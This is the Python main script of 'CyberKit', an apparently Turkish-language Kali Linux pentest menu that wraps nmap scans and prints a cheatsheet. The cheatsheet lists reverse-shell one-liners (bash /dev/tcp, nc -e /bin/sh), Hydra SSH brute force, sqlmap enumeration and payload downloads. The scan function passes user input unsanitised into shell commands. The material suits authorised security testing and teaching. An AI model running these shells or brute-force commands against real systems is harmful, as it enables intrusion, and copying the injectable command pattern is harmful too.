#!/usr/bin/env python3
"""
CyberKit - All-in-One Cybersecurity Toolkit for Kali Linux
Main Entry Point
"""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from cyberkit.utils.colors import *
from cyberkit.utils.helpers import *
from cyberkit.modules.network_scanner import NetworkScanner
from cyberkit.modules.web_scanner import WebScanner
from cyberkit.modules.osint import OSINTModule
from cyberkit.modules.password_tools import PasswordTools
from cyberkit.modules.exploitation import ExploitationModule
from cyberkit.modules.report_generator import ReportGenerator

BANNER = f"""
{Colors.CYAN}
   ██████╗██╗   ██╗██████╗ ███████╗██████╗ ██╗  ██╗██╗████████╗
  ██╔════╝╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗██║ ██╔╝██║╚══██╔══╝
  ██║      ╚████╔╝ ██████╔╝█████╗  ██████╔╝█████╔╝ ██║   ██║   
  ██║       ╚██╔╝  ██╔══██╗██╔══╝  ██╔══██╗██╔═██╗ ██║   ██║   
  ╚██████╗   ██║   ██████╔╝███████╗██║  ██║██║  ██╗██║   ██║   
   ╚═════╝   ╚═╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝   ╚═╝   
{Colors.END}
{Colors.YELLOW}        ═══ All-in-One Cybersecurity Toolkit ═══{Colors.END}
{Colors.GREEN}                    Version 1.0.0{Colors.END}
{Colors.MAGENTA}              For Kali Linux Terminal{Colors.END}
"""

def check_dependencies():
    """Check for required tools and display status"""
    tools = {
        "Nmap": "nmap",
        "Gobuster": "gobuster",
        "Nikto": "nikto",
        "SQLMap": "sqlmap",
        "Hydra": "hydra",
        "John": "john",
        "Hashcat": "hashcat",
        "Metasploit": "msfconsole",
        "SearchSploit": "searchsploit",
        "WhatWeb": "whatweb",
        "theHarvester": "theHarvester",
    }
    
    print_info("Araç Durumu Kontrolü:\n")
    installed = 0
    for name, cmd in tools.items():
        if check_tool(cmd):
            print(f"  {Colors.GREEN}[✓]{Colors.END} {name}")
            installed += 1
        else:
            print(f"  {Colors.RED}[✗]{Colors.END} {name}")
    
    print(f"\n  {Colors.CYAN}Yüklü: {installed}/{len(tools)}{Colors.END}")
    
    if not check_root():
        print_warning("\nBazı özellikler root yetkisi gerektirir!")
    
    input("\nDevam etmek için Enter'a basın...")

def quick_scan_menu():
    """Quick scan options"""
    clear_screen()
    print_banner("=== HIZLI TARAMA ===\n")
    
    target = get_input("Hedef IP/Domain")
    if not target:
        return
    
    print(f"""
{Colors.YELLOW}Tarama Türü:{Colors.END}
[1] Hızlı Port Tarama
[2] Servis Tespiti
[3] Web Teknoloji Tespiti
[4] Tüm Temel Taramalar
    """)
    
    choice = get_input("Seçim", "4")
    
    if choice in ["1", "4"]:
        print_status("\nPort taraması yapılıyor...")
        cmd = f"nmap -T4 -F {target}"
        run_command_live(cmd)
    
    if choice in ["2", "4"]:
        print_status("\nServis tespiti yapılıyor...")
        cmd = f"nmap -sV -T4 --top-ports 100 {target}"
        run_command_live(cmd)
    
    if choice in ["3", "4"]:
        if check_tool("whatweb"):
            print_status("\nWeb teknoloji tespiti yapılıyor...")
            cmd = f"whatweb -a 3 {target}"
            run_command_live(cmd)
    
    input("\nDevam etmek için Enter'a basın...")

def show_cheatsheet():
    """Display useful commands cheatsheet"""
    clear_screen()
    print_banner("=== CHEATSHEET ===\n")
    
    cheatsheet = """
{cyan}[NMAP]{end}
  nmap -sV -sC -p- target          # Full scan with scripts
  nmap -sU --top-ports 100 target  # UDP scan
  nmap --script=vuln target        # Vulnerability scan

{cyan}[WEB]{end}
  gobuster dir -u URL -w wordlist  # Directory bruteforce
  nikto -h URL                     # Web vulnerability scan
  sqlmap -u "URL?id=1" --dbs       # SQL injection

{cyan}[PASSWORD]{end}
  john --wordlist=rockyou hash     # John the Ripper
  hashcat -m 0 hash wordlist       # Hashcat MD5
  hydra -l user -P pass.txt ssh://IP  # SSH brute force

{cyan}[EXPLOITATION]{end}
  msfconsole                       # Start Metasploit
  searchsploit apache 2.4          # Search exploits
  nc -lvnp 4444                    # Netcat listener

{cyan}[REVERSE SHELLS]{end}
  bash -i >& /dev/tcp/IP/PORT 0>&1
  python -c 'import socket,subprocess,os;...'
  nc -e /bin/sh IP PORT

{cyan}[FILE TRANSFER]{end}
  python3 -m http.server 8000      # HTTP server
  wget http://IP:8000/file         # Download
  curl http://IP:8000/file -o file # Download with curl

{cyan}[OSINT]{end}
  whois domain.com                 # WHOIS lookup
  dig domain.com ANY               # DNS records
  theHarvester -d domain -b all    # Email harvesting
""".format(cyan=Colors.CYAN, end=Colors.END)
    
    print(cheatsheet)
    input("\nDevam etmek için Enter'a basın...")

def main_menu():
    """Main menu loop"""
    network_scanner = NetworkScanner()
    web_scanner = WebScanner()
    osint_module = OSINTModule()
    password_tools = PasswordTools()
    exploitation = ExploitationModule()
    report_generator = ReportGenerator()
    
    while True:
        clear_screen()
        print(BANNER)
        
        print(f"""
{Colors.BOLD}╔════════════════════════════════════════════════════════════╗
║                        ANA MENÜ                             ║
╚════════════════════════════════════════════════════════════╝{Colors.END}

  {Colors.CYAN}[1]{Colors.END}  🌐 Network Scanner       {Colors.CYAN}[2]{Colors.END}  🕸️  Web Scanner
  {Colors.CYAN}[3]{Colors.END}  🔍 OSINT / Recon         {Colors.CYAN}[4]{Colors.END}  🔑 Password Tools
  {Colors.CYAN}[5]{Colors.END}  💀 Exploitation          {Colors.CYAN}[6]{Colors.END}  📄 Report Generator
  
  {Colors.YELLOW}[7]{Colors.END}  ⚡ Hızlı Tarama          {Colors.YELLOW}[8]{Colors.END}  📋 Cheatsheet
  {Colors.YELLOW}[9]{Colors.END}  🔧 Araç Durumu Kontrolü
  
  {Colors.RED}[0]{Colors.END}  🚪 Çıkış
        """)
        
        choice = get_input("Seçiminiz")
        
        if choice == "0":
            print_info("CyberKit kapatılıyor...")
            sys.exit(0)
        elif choice == "1":
            network_scanner.show_menu()
        elif choice == "2":
            web_scanner.show_menu()
        elif choice == "3":
            osint_module.show_menu()
        elif choice == "4":
            password_tools.show_menu()
        elif choice == "5":
            exploitation.show_menu()
        elif choice == "6":
            report_generator.show_menu()
        elif choice == "7":
            quick_scan_menu()
        elif choice == "8":
            show_cheatsheet()
        elif choice == "9":
            check_dependencies()
        else:
            print_error("Geçersiz seçim!")
            input("\nDevam etmek için Enter'a basın...")

def main():
    """Main entry point"""
    try:
        if len(sys.argv) > 1:
            if sys.argv[1] in ["-h", "--help"]:
                print(f"""
{Colors.CYAN}CyberKit - All-in-One Cybersecurity Toolkit{Colors.END}

Kullanım: python3 cyberkit.py [seçenek]

Seçenekler:
  -h, --help     Bu yardım mesajını göster
  -v, --version  Versiyon bilgisini göster
  -c, --check    Araç durumunu kontrol et

İnteraktif mod için parametresiz çalıştırın.
                """)
                sys.exit(0)
            elif sys.argv[1] in ["-v", "--version"]:
                print(f"{Colors.CYAN}CyberKit v1.0.0{Colors.END}")
                sys.exit(0)
            elif sys.argv[1] in ["-c", "--check"]:
                check_dependencies()
                sys.exit(0)
        
        main_menu()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Ctrl+C ile çıkıldı.{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print_error(f"Hata: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
